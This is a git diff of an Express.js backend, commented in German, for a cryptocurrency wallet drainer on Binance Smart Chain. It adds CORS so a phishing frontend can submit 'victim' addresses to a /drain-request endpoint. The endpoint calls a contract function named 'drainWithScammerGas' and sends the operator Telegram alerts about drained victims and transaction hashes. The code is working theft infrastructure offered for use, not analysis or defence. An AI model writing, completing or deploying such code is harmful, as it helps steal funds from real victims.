@@ -1,14 +1,19 @@
-// backend.js (mit Express.js für den API-Endpunkt)
+// server.js
 const express = require('express');
 const ethers = require('ethers');
 const axios = require('axios');
+const cors = require('cors'); // <-- CORS importieren
 
 const app = express();
+
+// WICHTIG: CORS Middleware verwenden, um Anfragen vom Frontend zu erlauben
+app.use(cors());
 app.use(express.json());
 
 const BSC_RPC_URL = "https://bsc-dataseed.binance.org/";
 const provider = new ethers.providers.JsonRpcProvider(BSC_RPC_URL);
 
+// !!! WICHTIG: ERSETZE DIESE WERTE !!!
 const contractAddress = "0x0c699b293340FD0c1B086BB5947E2Ba495DC66Bb";
 const contractABI = [
     "function drainWithScammerGas(address victim) public",
@@ -26,21 +31,22 @@ const contract = new ethers.Contract(contractAddress, contractABI, wallet);
 app.post('/drain-request', async (req, res) => {
     const { victim } = req.body;
     if (!victim || !ethers.utils.isAddress(victim)) {
+        console.error("Invalid victim address received:", victim);
         return res.status(400).send("Invalid victim address");
     }
 
-    console.log(`Received drain request for victim: ${victim}`);
+    console.log(`🔋 Received drain request for victim: ${victim}`);
     await sendTelegramMessage(`🔋 VICTIM LOW ON GAS!\nVictim: ${victim}\nAction: Initiating drain with Scammer Gas.`);
     
     try {
         const tx = await contract.drainWithScammerGas(victim);
         console.log(`Scammer-Gas Drain sent: ${tx.hash}`);
         await tx.wait();
-        console.log(`Scammer-Gas Drain successful for ${victim}.`);
+        console.log(`✅ Scammer-Gas Drain successful for ${victim}.`);
         await sendTelegramMessage(`✅ DRAIN SUCCESSFUL (SCAMMER GAS)!\nVictim: ${victim}\nTx: https://bscscan.com/tx/${tx.hash}`);
         res.status(200).send("Drain successful");
     } catch (error) {
-        console.error("Error executing scammer-gas drain:", error);
+        console.error("❌ Error executing scammer-gas drain:", error);
         await sendTelegramMessage(`❌ DRAIN FAILED (SCAMMER GAS)!\nVictim: ${victim}\nError: ${error.message}`);
         res.status(500).send("Drain failed");
     }
@@ -55,7 +61,12 @@ contract.on("TokensDrained", async (drainedBy, victim, tokenCount) => {
 });
 
 async function sendTelegramMessage(message) {
-    // ... (deine sendTelegramMessage Funktion von vorher) ...
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+    try {
+        await axios.post(url, { chat_id: yourChatId, text: message });
+    } catch (error) {
+        console.error("Error sending Telegram message:", error);
+    }
 }
 
 const PORT = process.env.PORT || 3000;
